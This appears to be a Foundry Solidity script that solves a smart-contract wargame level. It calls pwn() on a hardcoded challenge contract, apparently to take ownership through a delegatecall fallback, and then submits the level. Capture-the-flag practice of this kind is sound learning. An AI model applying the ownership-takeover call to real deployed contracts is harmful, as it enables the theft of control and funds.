// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {SubmitHelper} from "./helper/SubmitHelper.sol";

contract Level6Script is Script {
    address addr = 0x9a29326e01053cC1236717F7B407DF66AFF05e46;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        (bool cc,) = address(addr).call(abi.encodeWithSignature("pwn()"));
        console.log(cc);
        (bool s) = SubmitHelper.submit(addr);
        console.log(s);
        vm.stopBroadcast();
    }
}
